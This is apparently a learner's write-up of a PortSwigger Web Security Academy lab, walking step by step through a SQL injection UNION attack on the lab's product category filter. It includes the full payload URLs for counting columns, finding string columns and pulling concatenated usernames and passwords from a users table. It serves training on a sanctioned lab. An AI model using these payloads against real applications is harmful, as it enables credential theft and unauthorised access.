# SQL injection UNION attack
> https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column


### Mission
Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

### Findig vulnerable inputs...

There seems to be only links to different products categories, which are send to backend via url variable.

> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets

Adding sql string ending '(quote) to the url and check if we get any error.
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets'

And we get internal server error, which tell that this input queries database without validation or sanitization.

### Needed to exploit UNION attack

1. UNION attack needs to querie same amount of columns as the original query result sends.
2. UNIONs columns need to be the same type as original query results. Usually only interested in string-types to extract data.

##### Check columns count

To check the columns count from the original query, we try to put them in order from first column until we get error, or different result.
Other way is to *UNION SELECT NULL,NULL...--* until we get an error or different result. Same when checking the types.

> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' ORDER BY 1--
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' ORDER BY 2--
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' ORDER BY 3--

After the thirt try we get another *internal server error*, so there is only 2 columns in the original query.

<img width="1068" height="338" alt="sqlMultiError" src="https://github.com/user-attachments/assets/cd6bf0f8-635e-4cb0-a348-d6bd841940e8" />


##### Check columns types

trying different types to UNION for every column.
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' UNION SELECT 'StringHere',NULL--
> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'OrHere'--

And the second string in displayed on the screen *'orHere'*, which tells that from this we can extract string data with UNION.
The first column is number if checked.

<img width="1267" height="808" alt="sqlMultiTypes" src="https://github.com/user-attachments/assets/f5810193-1bb7-4eb8-9aea-77af6e39d66d" />


##### Extract data

Because there is only one column with text output, we need to concate the username and password columns as one column within sql-query<br />
> ' UNION SELECT NULL,<column1>||'*'||<column2>

we could extract them one by one with <br />

> *' UNION SELECT NULL,username FROM users* <br /> *' UNION SELECT NULL,password FROM users*

> https://0a53009604dbb096835528d800df0003.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,username||'~'||password FROM users--

<img width="1331" height="924" alt="sqlMultiFetchusername" src="https://github.com/user-attachments/assets/d812ab69-cbab-4266-8c25-ab10385ac70d" />

##### Login with the admin credentials

<img width="1250" height="649" alt="sqlMultiFetchLogin" src="https://github.com/user-attachments/assets/909e9f54-dce7-4154-a996-2081d5a1045d" />


